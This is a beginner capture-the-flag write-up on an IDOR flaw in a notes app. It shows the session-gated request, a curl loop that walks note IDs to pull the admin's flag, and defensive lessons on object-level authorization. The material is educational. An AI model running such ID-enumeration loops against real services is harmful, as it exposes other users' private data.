CTF Writeup: Web 101

Published May 17, 2026 · by 7heKnight

CTF Writeup Web Security IDOR

A clean beginner web challenge that teaches one of the most common real-world bugs: IDOR (Insecure Direct Object Reference). This is a generic, educational walkthrough — no real target, safe to learn from.

The challenge

"We built a notes app. Each user only sees their own notes. Prove us wrong — the flag is in the admin's note."

Recon

After registering and logging in, viewing a note shows a telling URL:

GET /note?id=1042  HTTP/1.1
Cookie: session=eyJ1c2VyIjoidGVzdCJ9...

The note id is a predictable integer and the request is only gated by an authenticated session — not by ownership. That's the whole vulnerability in one line.

Exploitation

Walk the IDs downward with a quick loop:

$ for i in $(seq 1 50); do
    curl -s -b "session=$SESSION" "http://target/note?id=$i" \
      | grep -i flag
  done
flag{1d0r_1s_st1ll_4_t0p_10_bug}

Note id=1 belonged to the admin account. No privilege escalation, no exploit chain — just a missing authorization check.

The flag

flag{1d0r_1s_st1ll_4_t0p_10_bug}

Lessons

  • Authentication ≠ authorization. Being logged in shouldn't grant access to everyone's objects.
  • Sequential IDs are an invitation. Use UUIDs and enforce ownership server-side.
  • Always check object-level access on every request — it's OWASP API #1 for a reason.
